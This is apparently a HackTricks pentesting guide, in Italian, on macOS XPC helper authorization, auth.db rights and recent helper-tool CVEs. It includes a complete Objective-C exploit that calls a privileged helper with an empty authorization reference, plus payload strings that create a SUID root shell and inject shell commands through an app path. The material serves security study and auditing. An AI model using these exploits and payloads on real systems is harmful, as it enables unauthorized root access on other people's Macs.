# macOS XPC Autorizzazione

{{#include ../../../../../banners/hacktricks-training.md}}

## Autorizzazione XPC

Apple propone anche un altro modo per autenticare se il processo che si connette ha **i permessi per chiamare un metodo XPC esposto**.

Quando un'applicazione ha bisogno di **eseguire azioni come utente privilegiato**, invece di eseguire l'app come utente privilegiato di solito installa come root un HelperTool come servizio XPC che può essere chiamato dall'app per svolgere quelle azioni. Tuttavia, l'app che chiama il servizio dovrebbe avere sufficiente autorizzazione.

### ShouldAcceptNewConnection always YES

Un esempio si può trovare in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` prova a **connettersi** al **HelperTool**. E in `HelperTool/HelperTool.m` la funzione **`shouldAcceptNewConnection`** **non verificherà** nessuno dei requisiti indicati precedentemente. Restituirà sempre YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Per maggiori informazioni su come configurare correttamente questo controllo:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Diritti dell'applicazione

Tuttavia, c'è una certa **autorizzazione in corso quando viene chiamato un metodo dal HelperTool**.

La funzione **`applicationDidFinishLaunching`** in `App/AppDelegate.m` creerà un riferimento di autorizzazione vuoto dopo l'avvio dell'app. Questo dovrebbe sempre funzionare.\
Poi, tenterà di **aggiungere alcuni diritti** a quel riferimento di autorizzazione chiamando `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
La funzione `setupAuthorizationRights` da `Common/Common.m` memorizza nell'auth database `/var/db/auth.db` i diritti dell'applicazione. Nota come aggiungerà soltanto i diritti che non sono ancora presenti nel database:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
La funzione `enumerateRightsUsingBlock` è quella usata per ottenere i permessi delle applicazioni, che sono definiti in `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Questo significa che al termine di questo processo, le autorizzazioni dichiarate dentro `commandInfo` saranno memorizzate in `/var/db/auth.db`. Nota come lì puoi trovare per **ogni metodo** che **richiederà l'autenticazione**, **il nome del permesso** e il **`kCommandKeyAuthRightDefault`**. Quest'ultimo **indica chi può ottenere questo diritto**.

Esistono diversi ambiti per indicare chi può accedere a un diritto. Alcuni di essi sono definiti in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), ma in sintesi:

<table><thead><tr><th width="284.3333333333333">Nome</th><th width="165">Valore</th><th>Descrizione</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Chiunque</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Nessuno</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>L'utente corrente deve essere un amministratore (appartenente al gruppo admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Chiedere all'utente di autenticarsi.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Chiedere all'utente di autenticarsi. Deve essere un amministratore (appartenente al gruppo admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Specificare regole</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Specificare alcuni commenti aggiuntivi sul diritto</td></tr></tbody></table>

### Verifica dei diritti

In `HelperTool/HelperTool.m` la funzione **`readLicenseKeyAuthorization`** verifica se il chiamante è autorizzato a **eseguire tale metodo** chiamando la funzione **`checkAuthorization`**. Questa funzione controllerà che i **`authData`** inviati dal processo chiamante abbiano un **formato corretto** e poi verificherà **ciò che è necessario per ottenere il diritto** di chiamare il metodo specifico. Se tutto va bene **l'`error` restituito sarà `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Nota che per **verificare i requisiti per ottenere il diritto** di chiamare quel metodo la funzione `authorizationRightForCommand` controllerà semplicemente l'oggetto precedentemente commentato **`commandInfo`**. Poi, chiamerà **`AuthorizationCopyRights`** per verificare **se ha i diritti** per chiamare la funzione (nota che i flag consentono l'interazione con l'utente).

In questo caso, per chiamare la funzione `readLicenseKeyAuthorization` il `kCommandKeyAuthRightDefault` è definito come `@kAuthorizationRuleClassAllow`. Quindi **chiunque può chiamarla**.

### Informazioni sul DB

È stato menzionato che queste informazioni sono memorizzate in `/var/db/auth.db`. Puoi elencare tutte le regole memorizzate con:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Quindi, puoi leggere chi può accedere al right con:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Diritti permissivi

Puoi trovare **tutte le configurazioni dei permessi** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), ma le combinazioni che non richiederebbero l'interazione dell'utente sarebbero:

1. **'authenticate-user': 'false'**
- Questa è la chiave più diretta. Se impostata su `false`, specifica che un utente non deve fornire l'autenticazione per ottenere questo diritto.
- Viene usata in **combinazione con una delle 2 seguenti o indicando un gruppo** al quale l'utente deve appartenere.
2. **'allow-root': 'true'**
- Se un utente sta operando come root (che ha permessi elevati), e questa chiave è impostata a `true`, l'utente root potrebbe potenzialmente ottenere questo diritto senza ulteriore autenticazione. Tuttavia, tipicamente ottenere lo status di root richiede già autenticazione, quindi questo non è uno scenario di "nessuna autenticazione" per la maggior parte degli utenti.
3. **'session-owner': 'true'**
- Se impostato su `true`, il proprietario della sessione (l'utente attualmente loggato) otterrebbe automaticamente questo diritto. Questo potrebbe bypassare ulteriori autenticazioni se l'utente è già loggato.
4. **'shared': 'true'**
- Questa chiave non concede diritti senza autenticazione. Invece, se impostata su `true`, significa che una volta che il diritto è stato autenticato, può essere condiviso tra più processi senza che ciascuno debba ri-autenticarsi. Ma la concessione iniziale del diritto richiederebbe comunque autenticazione a meno che non venga combinata con altre chiavi come `'authenticate-user': 'false'`.

You can [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) to get the interesting rights:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Casi di Bypass dell'Autorizzazione

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Il servizio Mach privilegiato `com.acustica.HelperTool` accetta ogni connessione e la sua routine `checkAuthorization:` chiama `AuthorizationCopyRights(NULL, …)`, quindi qualsiasi blob di 32 byte passa. `executeCommand:authorization:withReply:` poi inserisce stringhe separate da virgola controllate dall'attaccante in `NSTask` come root, generando payload come:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
Crea facilmente una SUID root shell. Dettagli in [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Il listener restituisce sempre YES e lo stesso pattern NULL `AuthorizationCopyRights` appare in `checkAuthorization:`. Il metodo `exchangeAppWithReply:` concatena l'input dell'attaccante in una stringa passata a `system()` due volte, quindi iniettando metacaratteri della shell in `appPath` (es. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) si ottiene l'esecuzione di codice come root tramite il Mach service `com.plugin-alliance.pa-installationhelper`. Maggiori info [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).
- **CVE-2024-4395 – Jamf Compliance Editor helper**: L'esecuzione di un audit scrive `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, espone il Mach service `com.jamf.complianceeditor.helper` ed esporta `-executeScriptAt:arguments:then:` senza verificare l'`AuthorizationExternalForm` del chiamante o la firma del codice. Un exploit banale esegue `AuthorizationCreate` per ottenere un riferimento vuoto, si connette con `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` e invoca il metodo per eseguire binari arbitrari come root. Note di reversing complete (più PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 e 7.4.0–7.4.2 accettavano messaggi XPC appositamente creati che raggiungevano un helper privilegiato privo di controlli di autorizzazione. Poiché l'helper si fidava del proprio `AuthorizationRef` privilegiato, qualsiasi utente locale in grado di inviare messaggi al servizio poteva costringerlo ad eseguire modifiche di configurazione arbitrarie o comandi come root. Dettagli in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Suggerimenti per il triage rapido

- Quando un'app distribuisce sia una GUI che un helper, diff i loro code requirements e verifica se `shouldAcceptNewConnection` blocca il listener con `-setCodeSigningRequirement:` (o valida `SecCodeCopySigningInformation`). Controlli mancanti di solito portano a scenari CWE-863 come nel caso Jamf. Un rapido sguardo appare così:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Confronta ciò che l'helper *ritiene* di autorizzare con ciò che il client fornisce. Durante il reversing, interrompi su `AuthorizationCopyRights` e conferma che l'`AuthorizationRef` origina da `AuthorizationCreateFromExternalForm` (fornito dal client) invece che dal contesto privilegiato dell'helper; altrimenti probabilmente hai trovato un pattern CWE-863 simile ai casi sopra.

## Analisi inversa di Authorization

### Verifica se EvenBetterAuthorization viene usato

Se trovi la funzione: **`[HelperTool checkAuthorization:command:]`** probabilmente il processo sta usando lo schema di autorizzazione menzionato precedentemente:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Quindi, se questa funzione chiama funzioni come `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, sta usando [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Controlla **`/var/db/auth.db`** per vedere se è possibile ottenere permessi per chiamare qualche azione privilegiata senza interazione dell'utente.

### Comunicazione del protocollo

Poi, devi trovare lo schema del protocollo per poter stabilire una comunicazione con il servizio XPC.

La funzione **`shouldAcceptNewConnection`** indica il protocollo che viene esportato:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

In questo caso, abbiamo lo stesso di EvenBetterAuthorizationSample, [**controlla questa riga**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Conoscendo il nome del protocollo usato, è possibile **dump its header definition** con:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Infine, dobbiamo solo conoscere il **nome del Mach Service esposto** per stabilire una comunicazione con esso. Ci sono diversi modi per trovarlo:

- Nel **`[HelperTool init]`** dove puoi vedere il Mach Service utilizzato:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Nel plist di launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Esempio di Exploit

In questo esempio vengono creati:

- La definizione del protocollo con le funzioni
- Un auth vuoto da usare per richiedere l'accesso
- Una connessione al servizio XPC
- Una chiamata alla funzione se la connessione è stata stabilita con successo
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Altri helper di privilegi XPC abusati

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Riferimenti

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
